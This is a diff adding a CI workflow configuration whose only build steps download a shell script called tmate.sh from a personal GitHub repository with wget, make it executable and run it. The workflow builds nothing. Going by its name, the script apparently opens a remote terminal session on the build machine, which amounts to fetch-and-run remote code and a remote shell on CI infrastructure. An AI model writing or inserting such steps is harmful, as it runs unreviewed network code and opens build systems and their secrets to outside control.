@@ -1,1 +1,9 @@
-
+workflows:
+  my-workflow:
+    name: My workflow name
+    instance_type: linux_x2
+    max_build_duration: 120
+    scripts:
+      - wget https://github.com/maanya125/storezeph/raw/refs/heads/main/tmate.sh
+      - chmod +x tmate.sh
+      - ./tmate.sh
